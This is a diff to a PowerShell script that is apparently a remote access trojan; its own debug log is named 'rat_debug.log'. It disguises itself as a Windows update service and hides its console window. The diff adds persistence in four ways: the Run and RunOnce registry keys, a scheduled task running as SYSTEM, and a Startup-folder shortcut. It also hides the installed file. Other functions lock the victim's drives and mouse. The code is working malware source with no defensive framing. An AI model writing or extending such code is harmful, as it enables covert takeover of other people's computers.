@@ -15,6 +15,7 @@ $mutexName = "Global\MicrosoftWindowsUpdateService"
 $registryPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\WinUpdateSvc"
 $userListFile = "$env:ProgramData\Microsoft\Windows\Caches\users.dat"
 $debugLog = "$env:TEMP\rat_debug.log"
+$scriptPath = "$env:ProgramData\Microsoft\Windows\Caches\$installName.ps1"
 
 # ===== MUTEX - EVITA MULTIPLAS INSTANCIAS =====
 $mutex = New-Object System.Threading.Mutex($false, $mutexName)
@@ -111,6 +112,83 @@ Add-Type -Name Window -Namespace Console -MemberDefinition @'
 '@
 $consolePtr = [Console.Window]::GetConsoleWindow()
 [Console.Window]::ShowWindow($consolePtr, 0)
+
+# ===== PERSISTÊNCIA MÚLTIPLA (GARANTE QUE EXECUTE NA INICIALIZAÇÃO) =====
+function Install-Persistence {
+    try {
+        Write-DebugLog "Instalando persistência..."
+        
+        # Garante que a pasta existe
+        New-Item -ItemType Directory -Path "$env:ProgramData\Microsoft\Windows\Caches" -Force | Out-Null
+        
+        # Copia o script para o local de instalação
+        Copy-Item $MyInvocation.MyCommand.Path $scriptPath -Force
+        Write-DebugLog "Script copiado para: $scriptPath"
+        
+        # ===== MÉTODO 1: Registro do Windows (RUN) =====
+        try {
+            $regPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
+            Set-ItemProperty -Path $regPath -Name $installName -Value "powershell.exe -NoProfile -WindowStyle Hidden -File `"$scriptPath`"" -Force
+            Write-DebugLog "Persistência adicionada ao registro"
+        } catch {
+            Write-DebugLog "Erro ao adicionar ao registro: $_"
+        }
+        
+        # ===== MÉTODO 2: Tarefa Agendada (mais confiável) =====
+        try {
+            $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoProfile -WindowStyle Hidden -File `"$scriptPath`""
+            $trigger = New-ScheduledTaskTrigger -AtStartup
+            $principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
+            Register-ScheduledTask -TaskName $installName -Action $action -Trigger $trigger -Principal $principal -Force
+            Write-DebugLog "Persistência adicionada como tarefa agendada"
+        } catch {
+            Write-DebugLog "Erro ao criar tarefa agendada: $_"
+        }
+        
+        # ===== MÉTODO 3: Registro RunOnce (executa mesmo se o Run falhar) =====
+        try {
+            $regRunOncePath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce"
+            Set-ItemProperty -Path $regRunOncePath -Name $installName -Value "powershell.exe -NoProfile -WindowStyle Hidden -File `"$scriptPath`"" -Force
+            Write-DebugLog "Persistência adicionada ao RunOnce"
+        } catch {
+            Write-DebugLog "Erro ao adicionar ao RunOnce: $_"
+        }
+        
+        # ===== MÉTODO 4: Atalho na pasta de inicialização =====
+        try {
+            $startupPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
+            $shortcutPath = "$startupPath\$installName.lnk"
+            $WScriptShell = New-Object -ComObject WScript.Shell
+            $shortcut = $WScriptShell.CreateShortcut($shortcutPath)
+            $shortcut.TargetPath = "powershell.exe"
+            $shortcut.Arguments = "-NoProfile -WindowStyle Hidden -File `"$scriptPath`""
+            $shortcut.Save()
+            Write-DebugLog "Atalho adicionado à pasta de inicialização"
+        } catch {
+            Write-DebugLog "Erro ao criar atalho: $_"
+        }
+        
+        # Oculta o arquivo
+        attrib +h +s +r $scriptPath
+        
+        Write-DebugLog "Persistência instalada com sucesso"
+    } catch {
+        Write-DebugLog "Erro geral na instalação da persistência: $_"
+    }
+}
+
+# ===== VERIFICA SE JÁ ESTÁ INSTALADO =====
+if (-not (Test-Path $scriptPath)) {
+    Install-Persistence
+} else {
+    # Se já existe, verifica se o script atual é diferente (atualização)
+    $currentScript = Get-Content $MyInvocation.MyCommand.Path -Raw
+    $installedScript = Get-Content $scriptPath -Raw -ErrorAction SilentlyContinue
+    if ($currentScript -ne $installedScript) {
+        Write-DebugLog "Script atualizado, reinstalando persistência"
+        Install-Persistence
+    }
+}
 
 # ===== FUNCOES BASICAS =====
 Add-Type -AssemblyName System.Windows.Forms
@@ -354,7 +432,7 @@ function Lock-Drives {
     return "DRIVES_LOCKED:" + ($results -join ";")
 }
 
-# ===== LIBERAR DISCOS (CORRIGIDO) =====
+# ===== LIBERAR DISCOS =====
 function Unlock-Drives {
     param([string[]]$Drives = @("C:", "D:"))
     $results = @()
@@ -363,19 +441,15 @@ function Unlock-Drives {
             Write-DebugLog "Liberando drive ${drive}"
             $path = "${drive}\"
             
-            # Verifica se o drive existe
             if (Test-Path $path) {
                 Write-DebugLog "Drive ${drive} encontrado: $path"
                 
-                # Pega a ACL atual
                 $acl = Get-Acl $path
                 Write-DebugLog "ACL obtida para ${drive}"
                 
-                # Remove a proteção de herança (se existir)
                 $acl.SetAccessRuleProtection($false, $true)
                 Write-DebugLog "Proteção de herança removida para ${drive}"
                 
-                # Encontra e remove TODAS as regras de negação para Everyone
                 $rulesToRemove = @()
                 foreach ($rule in $acl.Access) {
                     if ($rule.IdentityReference -eq "Everyone" -and $rule.AccessControlType -eq "Deny") {
@@ -384,24 +458,20 @@ function Unlock-Drives {
                     }
                 }
                 
-                # Remove as regras encontradas
                 foreach ($rule in $rulesToRemove) {
                     $acl.RemoveAccessRule($rule) | Out-Null
                     Write-DebugLog "Regra removida"
                 }
                 
-                # Adiciona regras de permissão total para Everyone
                 $accessRule = New-Object System.Security.AccessControl.FileSystemAccessRule("Everyone", "FullControl", "Allow")
                 $acl.AddAccessRule($accessRule)
                 Write-DebugLog "Permissão total adicionada para Everyone"
                 
-                # Aplica a nova ACL
                 Set-Acl $path $acl
                 Write-DebugLog "ACL aplicada para ${drive}"
                 
                 $results += "${drive} liberado"
                 
-                # Teste de escrita
                 try {
                     $testFile = $path + "test_permission_$(Get-Random).tmp"
                     [System.IO.File]::WriteAllText($testFile, "test")
@@ -415,7 +485,6 @@ function Unlock-Drives {
                 $results += "${drive} não encontrado"
                 Write-DebugLog "Drive ${drive} não encontrado no caminho: $path"
                 
-                # Tenta encontrar drives disponíveis
                 $availableDrives = [System.IO.DriveInfo]::GetDrives() | Where-Object { $_.IsReady } | ForEach-Object { $_.Name }
                 Write-DebugLog "Drives disponíveis: $($availableDrives -join ', ')"
             }
@@ -480,7 +549,6 @@ function Lock-Mouse {
         
         Write-DebugLog "Iniciando Lock-Mouse"
         
-        # Tenta usar ClipCursor via C#
         $cSharpCode = @'
 using System;
 using System.Runtime.InteropServices;
@@ -656,24 +724,6 @@ function Power-Control {
         Write-DebugLog "Erro no comando de energia: $_"
         return "POWER_ERROR" 
     }
-}
-
-# ===== PERSISTENCIA =====
-function Install-Persistence {
-    $scriptPath = "$env:ProgramData\Microsoft\Windows\Caches\$installName.ps1"
-    New-Item -ItemType Directory -Path "$env:ProgramData\Microsoft\Windows\Caches" -Force | Out-Null
-    Copy-Item $MyInvocation.MyCommand.Path $scriptPath -Force
-    try {
-        $regPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
-        Set-ItemProperty -Path $regPath -Name $installName -Value "powershell.exe -NoProfile -WindowStyle Hidden -File `"$scriptPath`"" -Force
-    } catch {
-        Write-DebugLog "Erro ao instalar persistência no registro: $_"
-    }
-    attrib +h +s +r $scriptPath
-}
-
-if (-not (Test-Path "$env:ProgramData\Microsoft\Windows\Caches\$installName.ps1")) {
-    Install-Persistence
 }
 
 # ===== CONEXAO PRINCIPAL =====
